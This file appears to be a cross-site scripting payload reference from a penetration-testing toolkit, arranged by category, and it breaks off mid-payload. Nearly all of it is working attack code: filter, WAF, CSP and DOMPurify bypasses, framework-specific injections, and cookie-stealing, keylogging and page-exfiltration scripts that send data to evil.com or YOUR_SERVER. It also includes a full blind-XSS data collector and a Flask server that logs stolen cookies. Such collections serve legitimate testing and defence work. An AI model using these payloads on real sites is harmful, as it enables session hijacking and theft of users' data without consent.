# web-xss — payloads (verbatim from kali-claw)

# XSS Payloads / Attack Payloads

> This file is a companion to `SKILL.md`, containing a complete collection of XSS attack payloads organized by category.

---

## Index

1. [XSS Detection Payloads](#1-xss-detection-payloads)
2. [Reflected XSS](#2-reflected-xss)
3. [Stored XSS](#3-stored-xss)
4. [DOM-based XSS](#4-dom-based-xss)
5. [Event Handler Alternatives](#5-event-handler-alternatives)
6. [Encoding Bypass](#6-encoding-bypass)
7. [WAF Bypass Techniques](#7-waf-bypass-techniques)
8. [SVG / MathML Injection](#8-svg--mathml-injection)
9. [CSP Bypass Techniques](#9-csp-bypass-techniques)
10. [Cookie Stealing / Session Hijacking](#10-cookie-stealing--session-hijacking)
11. [Blind XSS](#11-blind-xss)

---

## 1. XSS Detection Payloads

Basic detection to confirm that the input point is controllable in the HTML context and the output is unencoded.

```text
# Most basic detection -- if alert fires, XSS is confirmed
https://target.com/search?q=<script>alert(1)</script>

# Event handler detection (when <script> tags are filtered)
https://target.com/search?q=<img src=x onerror=alert(1)>
https://target.com/search?q=<svg onload=alert(1)>
https://target.com/search?q=<body onload=alert(1)>
https://target.com/search?q=<input onfocus=alert(1) autofocus>

# Non-alert detection (suitable for scenarios where alerts cannot be seen)
https://target.com/search?q=<img src=x onerror=console.log('XSS')>
https://target.com/search?q=<script>document.title='XSS'</script>
```

---

## 2. Reflected XSS

Malicious payloads are submitted via URL parameters or forms, and the server embeds the input as-is into the response HTML.

```text
# Basic detection -- confirm input point in HTML context
https://target.com/search?q=<script>alert(1)</script>

# When <script> is filtered, use event handlers
https://target.com/search?q=<img src=x onerror=alert(1)>
https://target.com/search?q=<svg onload=alert(1)>
https://target.com/search?q=<body onload=alert(1)>
https://target.com/search?q=<input onfocus=alert(1) autofocus>

# Attribute value context escape (input lands in value="...")
https://target.com/search?q=" onmouseover=alert(1) "
https://target.com/search?q=' onfocus=alert(1) autofocus x='

# JavaScript context escape (input lands in <script> var='...')
https://target.com/search?q=';alert(1);//
https://target.com/search?q='-alert(1)-'
```

---

## 3. Stored XSS

Malicious payloads are persistently stored, and all users who access the data will trigger execution.

```text
# User nickname/comment -- persistent malicious payload
Username: <img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)>

# Filename injection -- uploaded filename contains XSS payload
Filename: "><svg onload=alert(1)>.png

# User-Agent / Referer Header -- admin panel may echo these
User-Agent: <script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

---

## 4. DOM-based XSS

The entire attack occurs on the client side without server involvement.

```javascript
// Vulnerable code example: using location.hash directly to write to DOM
// document.getElementById('output').innerHTML = location.hash.slice(1);

// Exploiting innerHTML:
https://target.com/page#<img src=x onerror=alert(1)>

// document.write injection
https://target.com/page?lang=en"><script>alert(1)</script>

// jQuery selector injection (CVE-2020-11022/23)
$("#element").html(location.hash);
// Exploit: #<img src=x onerror=alert(1)>

// eval / setTimeout / setInterval injection
// Vulnerable code: eval("var data = " + userInput);
// Exploit: 1;alert(1)//
```

---

## 5. Event Handler Alternatives

When common tags are filtered, use alternative event handlers and tags.

```html
<!-- Basic event handlers -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>

<!-- Advanced event handlers -->
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>

<!-- Animation events -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

---

## 6. Encoding Bypass

Bypass keyword-based filters using different encoding methods.

### HTML Entity Encoding

```html
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<svg/onload="&#x61;&#x6C;&#x65;&#x72;&#x74;(1)">
```

### URL Encoding / Double Encoding

```text
# URL encoding
%3Cscript%3Ealert(1)%3C/script%3E

# Double encoding
%253Cscript%253Ealert(1)%253C/script%253E
```

### Unicode Encoding

```html
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
```

### Base64 Encoding

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
```

---

## 7. WAF Bypass Techniques

### Mixed Case

```html
<ScRiPt>alert(1)</ScRiPt>
<iMg SrC=x OnErRoR=alert(1)>
```

### Double Encoding

```text
%253Cscript%253Ealert(1)%253C/script%253E
```

### HTML Entity Encoding

```html
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<svg/onload="&#x61;&#x6C;&#x65;&#x72;&#x74;(1)">
```

### Unicode Encoding

```html
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>
```

### String Concatenation to Bypass Keyword Detection

```html
<script>window['al'+'ert'](1)</script>
<img src=x onerror="window['al'+'ert'](docu['ment']['coo'+'kie'])">
```

### Newline/Tab Interference

```html
<svg/onload
=
alert(1)>
<img src=x	onerror=alert(1)>
```

### Null Byte Injection (some WAF parsing truncation)

```text
<scr%00ipt>alert(1)</script>
```

### Template Literal

```html
<script>alert`1`</script>
<img src=x onerror=alert`${document.cookie}`>
```

---

## 8. SVG / MathML Injection

Exploit SVG and MathML features to inject scripts, commonly used to bypass WAFs that only filter HTML tags.

```html
<!-- SVG animate -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>

<!-- SVG set -->
<svg><set onbegin=alert(1) attributeName=x to=1>

<!-- MathML nesting -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>

<!-- SVG foreignObject -->
<svg><foreignObject><body onload=alert(1)>

<!-- SVG script -->
<svg><script>alert(1)</script></svg>
```

---

## 9. CSP Bypass Techniques

Exploit Content Security Policy configuration flaws to bypass script execution restrictions.

```html
<!-- Exploit JSONP endpoint to bypass script-src restriction -->
<script src="https://allowed-domain.com/jsonp?callback=alert(1)"></script>

<!-- Exploit unsafe-eval -->
<script>eval("alert(1)")</script>

<!-- Exploit base tag to hijack resource loading -->
<base href="https://evil.com/">
<script src="/payload.js"></script>

<!-- Exploit object tag -->
<object data="data:text/html,<script>alert(1)</script>">

<!-- Exploit meta tag redirect (with URL parameter to pass payload) -->
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
```

---

## 10. Cookie Stealing / Session Hijacking

Post-exploitation payloads that demonstrate the actual impact of XSS vulnerabilities.

### Cookie Stealing

```javascript
// Cookie stealing + exfiltration
new Image().src = 'https://evil.com/steal?cookie=' + encodeURIComponent(document.cookie);
```

### Keylogger

```javascript
// Complete keylogger
document.addEventListener('keypress', function(e) {
    new Image().src = 'https://evil.com/log?key=' + encodeURIComponent(e.key);
});
```

### Page Content Stealing

```javascript
// Page content stealing
new Image().src = 'https://evil.com/exfil?html=' + encodeURIComponent(document.body.innerHTML);
```

---

## 11. Blind XSS

Inject payloads with external callbacks in locations where the response cannot be directly seen.

```bash
# Use external callback server to verify execution
# "><script src=https://your-callback.oastify.com></script>
# "><img src=https://your-callback.oastify.com/log?c="+document.cookie>

# Use XSStrike blind mode
python xsstrike.py -u "http://target.com/form" --blind

# Use Dalfox blind mode
dalfox url "http://target.com/form" -b https://your-callback.oastify.com

# XSS Hunter callback (professional blind XSS platform)
# payload: "><script src=https://xsshunter.com/YOUR_PAYLOAD_ID></script>
# payload: "'-alert(1)-'
# payload: "><img src=x onerror="fetch('https://YOUR_SUBDOMAIN.xss.ht/?c='+document.cookie)">
```

---

## 12. DOM XSS Exploitation

### Source-Sink Chains

```javascript
// Common DOM XSS sources and sinks
// Sources: location.hash, location.search, document.referrer, window.name, postMessage data

// Source: location.hash -> Sink: innerHTML
// Vulnerable code: document.getElementById('content').innerHTML = decodeURIComponent(location.hash.slice(1));
// Exploit URL:
// https://target.com/page#<img src=x onerror=alert(document.cookie)>

// Source: location.search -> Sink: document.write
// Vulnerable code: document.write('<h1>' + new URLSearchParams(location.search).get('title') + '</h1>');
// Exploit URL:
// https://target.com/page?title=</h1><script>alert(1)</script><h1>

// Source: document.referrer -> Sink: innerHTML
// Vulnerable code: document.getElementById('ref').innerHTML = document.referrer;
// Exploit: Navigate from a page with XSS payload in URL

// Source: window.name -> Sink: eval
// Vulnerable code: eval(window.name);
// Exploit: window.open('https://target.com/page', 'alert(document.cookie)');

// Source: localStorage -> Sink: innerHTML
// Vulnerable code: document.getElementById('prefs').innerHTML = localStorage.getItem('theme');
// Exploit: localStorage.setItem('theme', '<img src=x onerror=alert(1)>');
```

### postMessage Abuse

```javascript
// Exploit insecure postMessage handlers (no origin check)
// Vulnerable code on target:
// window.addEventListener('message', function(e) {
//   document.getElementById('output').innerHTML = e.data;
// });

// Attacker page that sends malicious message:
// <iframe src="https://target.com/page" id="victim"></iframe>
// <script>
//   document.getElementById('victim').onload = function() {
//     this.contentWindow.postMessage('<img src=x onerror=alert(document.cookie)>', '*');
//   };
// </script>

// Exploit postMessage with eval sink
// Vulnerable: window.addEventListener('message', (e) => { eval(e.data.code); });
// Attack:
var victim = window.open('https://target.com/page');
setTimeout(function() {
    victim.postMessage({code: 'fetch("https://evil.com/steal?c="+document.cookie)'}, '*');
}, 2000);

// Exploit postMessage with location sink
// Vulnerable: window.addEventListener('message', (e) => { location = e.data.url; });
// Attack:
victim.postMessage({url: 'javascript:alert(document.cookie)'}, '*');
```

### URL Fragment Injection

```javascript
// Hash-based DOM XSS exploitation techniques

// Angular.js hash injection (versions < 1.6)
// https://target.com/page#{{constructor.constructor('alert(1)')()}}

// jQuery BBQ plugin hash injection
// https://target.com/page#<img/src=x onerror=alert(1)>

// React Router hash injection (if dangerouslySetInnerHTML used with hash)
// https://target.com/#/page/<img src=x onerror=alert(1)>

// Exploit hash change event handlers
// Vulnerable: window.onhashchange = function() { eval(location.hash.slice(1)); };
// Exploit: https://target.com/page#alert(document.cookie)

// iframe srcdoc with hash
// <iframe src="https://target.com/page#<script>alert(1)</script>"></iframe>

// Chained hash injection with URL encoding
// https://target.com/page#%3Cscript%3Ealert(1)%3C/script%3E
```

---

## 13. Mutation XSS (mXSS)

### mXSS via innerHTML

```html
<!-- mXSS exploits browser HTML parser re-serialization differences -->
<!-- When innerHTML is read and re-written, the browser may "fix" HTML in exploitable ways -->

<!-- Backtick mXSS (older browsers) -->
<img src="x` `<script>alert(1)</script>"` `>

<!-- Namespace confusion mXSS -->
<svg><![CDATA[><img src=x onerror=alert(1)>]]></svg>

<!-- Table element mXSS -->
<table><tr><td><svg><desc><table><tr><td><img src=x onerror=alert(1)>

<!-- Math/SVG namespace switching -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>

<!-- Form element mXSS -->
<form><math><mtext></form><form><mglyph><svg><mtext><style><img src=x onerror=alert(1)>
```

### DOMPurify Bypass

```html
<!-- DOMPurify bypass via namespace confusion (historical CVEs) -->
<!-- CVE-2020-26870 - nesting math/svg -->
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>

<!-- DOMPurify bypass via custom elements -->
<form><math><mtext></form><form><mglyph><svg><mtext><textarea><img src=x onerror=alert(1)>

<!-- Bypass via processing instructions -->
<?xml version="1.0"?><img src=x onerror=alert(1)>

<!-- Bypass via CDATA sections in SVG context -->
<svg><style><![CDATA[</style><img src=x onerror=alert(1)>]]></style></svg>

<!-- Bypass via attribute injection in sanitized context -->
<a id="x" tabindex="1" onfocus="alert(1)"></a>
```

### Browser Parser Differentials

```javascript
// Exploit differences between server-side and client-side HTML parsing

// Server sees: safe text. Browser sees: executable script
// Using encoding differences:
// UTF-7 (legacy): +ADw-script+AD4-alert(1)+ADw-/script+AD4-

// Exploit innerHTML vs textContent difference
// Safe: element.textContent = userInput;  (always safe)
// Unsafe: element.innerHTML = userInput;   (parses HTML)

// Browser-specific parsing quirks
// Chrome null byte handling:
// <scr\x00ipt>alert(1)</script>

// Firefox SVG parsing:
// <svg><script>alert&lpar;1&rpar;</script></svg>

// Edge legacy parsing:
// <img src=x onerror="alert(1)"/**//>

// Exploit DOMParser vs innerHTML differences
var parser = new DOMParser();
var doc = parser.parseFromString('<img src=x onerror=alert(1)>', 'text/html');
// DOMParser creates inert document (no script execution)
// But if nodes are adopted into live document:
document.body.appendChild(document.adoptNode(doc.body.firstChild));
// Scripts execute!
```

---

## 14. XSS in Modern Frameworks

### React dangerouslySetInnerHTML

```javascript
// React XSS via dangerouslySetInnerHTML
// Vulnerable component:
// function UserProfile({ bio }) {
//   return <div dangerouslySetInnerHTML={{__html: bio}} />;
// }
// Payload stored in bio field:
// <img src=x onerror="fetch('https://evil.com/steal?t='+document.cookie)">

// React XSS via href with javascript: protocol
// Vulnerable: <a href={userInput}>Click</a>
// Payload: javascript:alert(document.cookie)

// React XSS via SSR (Server-Side Rendering) hydration mismatch
// If server renders unescaped content that React hydrates:
// Server output: <div id="root"><script>alert(1)</script></div>

// React XSS via ref manipulation
// const ref = useRef();
// ref.current.innerHTML = userControlledData; // Bypasses React's escaping

// React XSS via style injection (CSS-based data exfiltration)
// Vulnerable: <div style={userStyles}>
// Payload: {background: "url('https://evil.com/steal?data='+document.cookie)"}
```

### Angular Template Injection

```javascript
// Angular template injection (Client-Side Template Injection - CSTI)

// AngularJS (1.x) sandbox escape payloads:
// {{constructor.constructor('alert(1)')()}}
// {{$on.constructor('alert(1)')()}}
// {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}

// Angular (2+) template injection via innerHTML binding:
// Vulnerable: <div [innerHTML]="userInput"></div>
// Angular sanitizes by default, but bypass via:
// <div [innerHTML]="bypassSecurityTrustHtml(userInput)"></div>

// Angular XSS via bypassSecurityTrust methods:
// this.sanitizer.bypassSecurityTrustHtml(userInput)
// this.sanitizer.bypassSecurityTrustScript(userInput)
// this.sanitizer.bypassSecurityTrustUrl(userInput)
// this.sanitizer.bypassSecurityTrustResourceUrl(userInput)

// Angular Universal (SSR) injection:
// If server renders user input without sanitization before Angular hydrates
// Payload in URL parameter rendered server-side:
// https://target.com/page?name=<script>alert(1)</script>
```

### Vue v-html

```javascript
// Vue.js XSS via v-html directive
// Vulnerable template: <div v-html="userContent"></div>
// Payload: <img src=x onerror="alert(document.cookie)">

// Vue.js XSS via dynamic component rendering
// Vulnerable: <component :is="userInput"></component>
// Payload: { template: '<img src=x onerror=alert(1)>' }

// Vue.js XSS via compile function (Vue 2)
// Vulnerable: Vue.compile(userInput)
// Payload: <img src=x onerror=alert(1)>

// Vue.js XSS via server-side rendering (Nuxt.js)
// If asyncData or fetch returns unsanitized HTML:
// async asyncData({ params }) {
//   return { content: await fetchUnsanitizedContent(params.id) }
// }
// Template: <div v-html="content"></div>

// Vue.js XSS via URL binding
// Vulnerable: <a :href="userUrl">Link</a>
// Payload: javascript:alert(document.cookie)
```

---

## 15. Blind XSS Payloads

### XSS Hunter Setup

```javascript
// XSS Hunter-style payload for blind XSS detection
// Full-featured callback payload:
"><script>
(function(){
  var exfil = 'https://YOUR_SERVER.com/collect';
  var data = {
    url: document.URL,
    cookie: document.cookie,
    localStorage: JSON.stringify(localStorage),
    dom: document.documentElement.outerHTML.substring(0, 5000),
    origin: document.location.origin,
    referrer: document.referrer,
    userAgent: navigator.userAgent,
    timestamp: new Date().toISOString()
  };
  var img = new Image();
  img.src = exfil + '?d=' + btoa(JSON.stringify(data));
})();
</script>

// Minimal blind XSS payload (fits in small input fields)
"><img src=x onerror="fetch('https://YOUR_SERVER/x?c='+btoa(document.cookie))">

// Polyglot blind XSS (works in multiple contexts)
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
```

### Callback Servers

```python
# Simple blind XSS callback server
from flask import Flask, request
from datetime import datetime
import json
import base64

app = Flask(__name__)

@app.route('/collect', methods=['GET', 'POST'])
def collect():
    """Receive and log blind XSS callbacks."""
    timestamp = datetime.now().isoformat()
    
    if request.method == 'GET' and 'd' in request.args:
        try:
            data = json.loads(base64.b64decode(request.args['d']))
        except Exception:
            data = {'raw': request.args.get('d', '')}
    else:
        data = {
            'cookie': request.args.get('c', ''),
            'url': request.args.get('url', ''),
            'headers': dict(request.headers)
        }
    
    entry = {
        'timestamp': timestamp,
        'source_ip': request.remote_addr,
        'data': data
    }
    
    with open('blind_xss_hits.json', 'a') as f:
        f.write(json.dumps(entry) + '\n')
    
    print(f"[!] Blind XSS triggered at {timestamp}")
    print(f"    Source: {request.remote_addr}")
    print(f"    URL: {data.get('url', 'unknown')}")
    print(f"    Cookie: {data.get('cookie', 'none')}")
    
    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8443, ssl_context='adhoc')
```

### Delayed Execution

```javascript
// Blind XSS with delayed execution (evade WAF timing detection)
"><script>
setTimeout(function(){
  var s = document.createElement('script');
  s.src = 'https://YOUR_SERVER/payload.js';
  document.body.appendChild(s);
}, 30000); // Execute after 30 seconds
</script>

// Blind XSS via Service Worker registration (persistent)
"><script>
if('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js').then(function(reg){
    fetch('https://YOUR_SERVER/sw-registered?origin='+location.origin);
  });
}
</script>

// Blind XSS with MutationObserver (triggers on DOM changes)
"><script>
var observer = new MutationObserver(function(mutations) {
  fetch('https://YOUR_SERVER/dom-change', {
    method: 'POST',
    body: JSON.stringify({
      url: location.href,
      cookie: document.cookie,

<!-- truncated for token budget; see external/kali-claw for the rest -->

